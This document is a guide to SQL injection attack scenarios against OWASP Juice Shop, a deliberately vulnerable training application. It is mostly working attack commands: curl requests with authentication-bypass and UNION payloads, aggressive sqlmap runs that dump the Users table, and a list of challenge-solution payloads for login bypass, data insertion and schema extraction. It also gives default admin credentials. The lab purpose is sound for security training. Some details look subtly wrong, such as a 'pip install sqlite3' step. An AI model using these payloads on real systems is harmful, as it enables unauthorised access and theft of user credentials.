# OWASP Juice Shop SQL Injection Attack Scenarios

## Overview

This document provides comprehensive SQL injection attack scenarios specifically designed for OWASP Juice Shop. These scenarios cover all major SQL injection vulnerabilities present in the application, including authentication bypass, data extraction, and privilege escalation.

## Juice Shop SQL Injection Vulnerabilities

### 1. Login Authentication Bypass (SQLi-1)

**Location:** `/rest/user/login`  
**Vulnerability:** Union-based SQL injection in email field  
**Database:** SQLite

### 2. Product Search Injection (SQLi-2)

**Location:** `/rest/products/search`  
**Vulnerability:** Boolean-based blind SQL injection  
**Database:** SQLite

### 3. Order History Injection (SQLi-3)

**Location:** `/rest/track-order`  
**Vulnerability:** Error-based SQL injection  
**Database:** SQLite

### 4. User Registration Injection (SQLi-4)

**Location:** `/api/Users`  
**Vulnerability:** Second-order SQL injection  
**Database:** SQLite

## Prerequisites

```bash
# Start OWASP Juice Shop
docker run -d -p 3000:3000 bkimminich/juice-shop

# Install required tools
pip3 install requests beautifulsoup4 sqlparse sqlite3
npm install -g juice-shop-cli
```

## Scenario 1: Authentication Bypass via SQL Injection

### Manual Testing

```bash
# Basic authentication bypass
curl -X POST "http://10.30.0.237:3000/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op'\''--","password":"anything"}'

# Union-based injection to extract admin credentials
curl -X POST "http://10.30.0.237:3000/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op'\'' UNION SELECT id,email,password FROM Users WHERE email='\''admin@juice-sh.op'\''--","password":"test"}'
```

### SQLMap Automated Testing

SQLMap is a powerful tool for automating the detection and exploitation of SQL injection vulnerabilities. Here's how to use it step-by-step:

1.  **Identify SQL injection vulnerability:**

    - Use the following command to test for SQL injection in the login form:

      ```bash
      sqlmap -u "http://10.30.0.237:3000/rest/user/login" --data='{"email":"test@test.com","password":"test"}' --headers="Content-Type: application/json" --level 5 --risk 3 --technique=U
      ```

    - `Explanation:`
      - `-u`: Specifies the target URL.
      - `--data`: Provides the POST data in JSON format.
      - `--headers`: Sets the Content-Type to application/json.
      - `--level 5`: Specifies the level of tests to perform (1-5, where 5 is the most thorough).
      - `--risk 3`: Specifies the risk level (1-3, where 3 includes more aggressive tests).
      - `--technique=U`: Focus on UNION-based attacks which work well with Juice Shop.

2.  **Using known credentials to help SQLMap:**

    - SQLMap works better with valid credentials. Use the admin account:

      ```bash
      sqlmap -u "http://10.30.0.237:3000/rest/user/login" --data='{"email":"admin@juice-sh.op","password":"admin123"}' --headers="Content-Type: application/json" --level 5 --risk 3 --dbs
      ```

    - This helps SQLMap understand successful vs. failed responses.
    - Note: The default admin credentials are `admin@juice-sh.op` / `admin123`

3.  **Enumerate databases:**

    - Once SQLMap confirms the vulnerability, enumerate the available databases:

      ```bash
      sqlmap -u "http://10.30.0.237:3000/rest/user/login" --data='{"email":"test@test.com\' OR 1=1--","password":"test"}' --headers="Content-Type: application/json" --level 5 --risk 3 --dbs
      ```

    - The payload `test@test.com\' OR 1=1--` helps bypass authentication.

4.  **Extract user table data:**

    - Target the Users table to extract email addresses and password hashes:

      ```bash
      sqlmap -u "http://10.30.0.237:3000/rest/user/login" --data='{"email":"test@test.com\' UNION SELECT * FROM Users--","password":"test"}' --headers="Content-Type: application/json" --level 5 --risk 3 -T Users --dump
      ```

5.  **Automate login bypass and privilege escalation:**

    - The following command attempts to bypass login and identify admin users:

      ```bash
      sqlmap -u "http://10.30.0.237:3000/rest/user/login" --data='{"email":"admin@juice-sh.op","password":"wrong"}' --headers="Content-Type: application/json" --level 5 --risk 3 --sql-query="SELECT * FROM Users WHERE role='admin'"
      ```

### OWASP Juice Shop SQL Injection Challenges

Several challenges in OWASP Juice Shop involve SQL injection. Here are the key challenges and their solutions:

1. **Login Admin Challenge:**

   - Solution: Enter `' OR 1=1--` in the email field and any text in the password field
   - Alternative: Use `admin@juice-sh.op'--` in email and any password

2. **Login Jim Challenge:**

   - Solution: Enter `jim@juice-sh.op'--` in email and any text in password field
   - This bypasses password verification for Jim's account

3. **Order Manipulation Challenge:**

   - Target: `/rest/track-order/{id}`
   - Solution: Send a request with payload `57' OR 1=1--` to see all orders

4. **Data Manipulation Challenge:**

   - Target: Product reviews
   - Solution: Post a review with `');INSERT INTO product_reviews VALUES(99,1,1,'SQL Injection','2023-01-01',(SELECT id FROM Users WHERE email='jim@juice-sh.op'),'jim@juice-sh.op')--`

5. **Retrieve Blueprint Challenge:**
   - Target: `/rest/products/search`
   - Solution: Query with `apple')) UNION SELECT id,sql,1,1,1,1,1,1,1 FROM sqlite_master--`
   - This retrieves database schema information

These SQLMap commands can be adapted for each of these challenges. For example, to target the product search vulnerability:

```bash
sqlmap -u "http://10.30.0.237:3000/rest/products/search?q=apple" --level 5 --risk 3 --technique=U --sql-query="SELECT sql FROM sqlite_master"
```
